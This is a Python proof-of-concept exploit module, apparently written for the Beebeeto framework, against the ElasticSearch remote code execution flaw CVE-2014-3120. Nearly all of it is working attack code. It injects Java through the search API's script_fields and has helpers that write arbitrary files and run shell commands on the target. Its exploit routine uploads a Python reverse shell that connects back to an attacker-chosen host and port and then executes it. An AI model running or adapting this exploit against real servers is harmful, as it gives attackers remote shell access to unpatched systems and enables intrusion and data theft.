#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/ff0000team/Beebeeto-framework
"""

import urllib2
try:
    import simplejson as json
except ImportError:
    import json

from baseframe import BaseFrame
from utils.http import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': '',  # 由Beebeeto官方编辑
            'name': 'ElasticSearch 远程代码执行漏洞',  # 名称
            'author': 'e3rp4y',  # 作者
            'create_date': '2014-09-22',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [9200],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ElasticSearch',  # 漏洞所涉及的应用名称
            'vul_version': ['less than 1.2'],  # 受漏洞影响的应用版本
            'type': 'Code Execution',  # 漏洞类型
            'tag': ['ElasticSearch', 'remote code execution', 'java'],  # 漏洞相关tag
            'desc': 'ElasticSearch 远程代码执行漏洞.',  # 漏洞描述
            'references': [
                'http://www.ipuman.com/pm6/137/',
                'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3120',
                'http://www.freebuf.com/tools/38025.html' # 参考链接
            ],
        },
    }

    def _init_user_parser(self):
        self.user_parser.add_option('-H', '--rhost',
                                    dest='rhost', help='remote host')
        self.user_parser.add_option('-P', '--rport',
                                    dest='rport', help='remote port')

    @classmethod
    def _emit(cls, args, exp):
        data = {
            'size': 1,
            'query': {
                'filtered': {
                    'query': {
                        'match_all': {}
                    }
                }
            },
            'script_fields': {
                'task': {
                    'script': exp
                }
            }
        }
        payload = json.dumps(data)
        headers = ForgeHeaders().get_headers()
        headers['Content-Type'] = 'application/json; charset=utf-8'
        headers['Accept'] = 'ext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        url = args['options']['target'] + '/_search?source'
        req = urllib2.Request(url, data=payload, headers=headers)
        resp = urllib2.urlopen(req)
        assert 200 == resp.getcode()
        ret = json.loads(resp.read())
        try:
            return ret['hits']['hits'][0]['fields']['task'][0]
        except:
            return None

    @classmethod
    def _upload(cls, args, dest, content):
        try:
            exp = 'import java.util.*;\nimport java.io.*;\nFile f = new File(\"' + dest + '\");if(f.exists()){\"exists\".toString();}BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\"UTF-8\"));bw.write(\"' + content + '\");bw.flush();bw.close();if(f.exists()){\"success\".toString();}'
            return cls._emit(args, exp)
        except:
            return None

    @classmethod
    def _execute(cls, args, cmd):
        try:
            exp = 'import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"'+cmd+'\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"#*!");}sb.toString();'
            rs = cls._emit(args, exp)
            return rs.replace('#*!', '\n')
        except:
            return None

    @classmethod
    def verify(cls, args):
        try:
            rs = cls._emit(args, 'Integer.toHexString(65535)')
            assert rs == 'ffff'
            args['success'] = True
            if args['options']['verbose']:
                print '[*] {} is vulnerable'.format(args['options']['target'])
        except:
            args['success'] = False

        return args

    @classmethod
    def exploit(cls, args):
        __import__('os').path.exists('/dev/shm/debug') and __import__('pdb').set_trace()
        rhost = args['options']['rhost']
        rport = args['options']['rport']
        if args['options']['verbose']:
            print '[*] Reverse shell connect to {}:{}'.format(rhost, rport)
        shellcode = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"%s\\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/bash\\",\\"-i\\"]);' % (rhost, rport)
        rs = cls._upload(args, '/dev/shm/es-vuls-demo.py', shellcode)
        if rs is None:
            if args['options']['verbose']:
                print '[x] upload shellcode to {} failed'.format(args['options']['target'])
            args['success'] = False
            return args
        rs = cls._execute(args, 'python /dev/shm/es-vuls-demo.py')
        if rs is None:
            if args['options']['verbose']:
                print '[x] remote code execute failed'
            args['success'] = False
            return args
        args['success'] = True
        return args

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
